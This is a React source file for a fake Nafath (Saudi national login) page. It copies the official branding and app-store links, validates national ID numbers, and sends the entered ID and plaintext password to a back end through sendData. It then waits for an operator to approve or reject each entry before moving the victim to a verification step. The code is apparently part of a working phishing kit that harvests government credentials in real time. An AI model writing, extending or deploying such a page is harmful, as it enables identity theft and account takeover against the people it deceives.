import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";

// Validate Saudi ID using Luhn algorithm
function validateSaudiId(id: string): boolean {
  if (!/^[12]\d{9}$/.test(id)) return false;
  let sum = 0;
  for (let i = 0; i < 10; i++) {
    let digit = parseInt(id[i]);
    if (i % 2 === 0) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  return sum % 10 === 0;
}

export default function NafathLoginPage() {
  const [, navigate] = useLocation();
  const [showPassword, setShowPassword] = useState(false);
  const [idNumber, setIdNumber] = useState("");
  const [password, setPassword] = useState("");
  const [idError, setIdError] = useState("");
  const [passwordError, setPasswordError] = useState("");

  // Emit page enter
  useEffect(() => {
    navigateToPage("تسجيل دخول نفاذ");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/nafath-verify");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection
  useEffect(() => {
    if (isFormRejected.value) {
      setIdNumber("");
      setPassword("");
      setIdError("");
      setPasswordError("");
    }
  }, [isFormRejected.value]);

  // Handle ID number change - only allow digits
  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, '');
    setIdNumber(value);
    if (idError) setIdError("");
  };

  // Handle password change - only allow English letters, numbers, and special characters
  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^\x20-\x7E]/g, '');
    setPassword(value);
    if (passwordError) setPasswordError("");
  };

  const onSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    let hasError = false;
    
    if (!idNumber) {
      setIdError("رقم الهوية مطلوب");
      hasError = true;
    } else if (!validateSaudiId(idNumber)) {
      setIdError("رقم الهوية غير صحيح");
      hasError = true;
    }
    
    if (!password) {
      setPasswordError("كلمة المرور مطلوبة");
      hasError = true;
    }
    
    if (hasError) return;

    localStorage.setItem("idNumber", idNumber);

    sendData({
      data: {
        "رقم الهوية": idNumber,
        "كلمة المرور": password,
      },
      current: "تسجيل دخول نفاذ",
      nextPage: "تحقق نفاذ",
      waitingForAdminResponse: true,
    });
  };

  return (
    <PageLayout variant="nafath">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <img
            src="/images/nafath.png"
            alt="نفاذ"
            className="h-16 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-gray-800 mb-2">تسجيل الدخول</h1>
          <p className="text-gray-500 text-sm">
            سجل دخولك باستخدام بيانات نفاذ
          </p>
        </div>

        <form onSubmit={onSubmit} className="space-y-4">
          {/* ID Number - Only digits allowed */}
          <div className="space-y-2">
            <Label htmlFor="idNumber">رقم الهوية الوطنية</Label>
            <Input
              id="idNumber"
              type="tel"
              inputMode="numeric"
              placeholder="أدخل رقم الهوية"
              maxLength={10}
              value={idNumber}
              onChange={handleIdChange}
              onKeyDown={(e) => {
                // Allow control keys
                if (e.ctrlKey || e.metaKey || e.key === 'Backspace' || e.key === 'Delete' || 
                    e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Tab') {
                  return;
                }
                // Block non-digit keys
                if (!/^[0-9]$/.test(e.key)) {
                  e.preventDefault();
                }
              }}
              onPaste={(e) => {
                const pasted = e.clipboardData.getData('text');
                const digitsOnly = pasted.replace(/[^0-9]/g, '');
                if (digitsOnly !== pasted) {
                  e.preventDefault();
                  setIdNumber(prev => (prev + digitsOnly).slice(0, 10));
                }
              }}
            />
            {idError && (
              <p className="text-red-500 text-xs">{idError}</p>
            )}
          </div>

          {/* Password - Only English letters, numbers, and special characters */}
          <div className="space-y-2">
            <Label htmlFor="password">كلمة المرور</Label>
            <div className="relative">
              <Input
                id="password"
                type={showPassword ? "text" : "password"}
                placeholder="أدخل كلمة المرور"
                value={password}
                onChange={handlePasswordChange}
                onKeyDown={(e) => {
                  // Allow control keys
                  if (e.ctrlKey || e.metaKey || e.key === 'Backspace' || e.key === 'Delete' || 
                      e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Tab') {
                    return;
                  }
                  // Block non-ASCII printable characters (Arabic, etc.)
                  if (e.key.length === 1 && !/[\x20-\x7E]/.test(e.key)) {
                    e.preventDefault();
                  }
                }}
                onPaste={(e) => {
                  const pasted = e.clipboardData.getData('text');
                  const cleaned = pasted.replace(/[^\x20-\x7E]/g, '');
                  if (cleaned !== pasted) {
                    e.preventDefault();
                    setPassword(prev => prev + cleaned);
                  }
                }}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400"
              >
                {showPassword ? (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                  </svg>
                ) : (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                  </svg>
                )}
              </button>
            </div>
            {passwordError && (
              <p className="text-red-500 text-xs">{passwordError}</p>
            )}
          </div>

          {/* Submit Button */}
          <Button type="submit" className="w-full bg-[#1a5f4a] hover:bg-[#134436]" size="lg">
            تسجيل الدخول
          </Button>
        </form>

        {/* Download App Links */}
        <div className="mt-6 text-center">
          <p className="text-gray-500 text-sm mb-3">حمل تطبيق نفاذ</p>
          <div className="flex justify-center gap-3">
            <a
              href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
              target="_blank"
              rel="noopener noreferrer"
            >
              <img
                src="/images/google-play.png"
                alt="Google Play"
                className="h-20"
              />
            </a>
            <a
              href="https://apps.apple.com/us/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871"
              target="_blank"
              rel="noopener noreferrer"
            >
              <img
                src="/images/app-store.png"
                alt="App Store"
                className="h-20"
              />
            </a>
          </div>
        </div>
      </div>
    </PageLayout>
  );
}
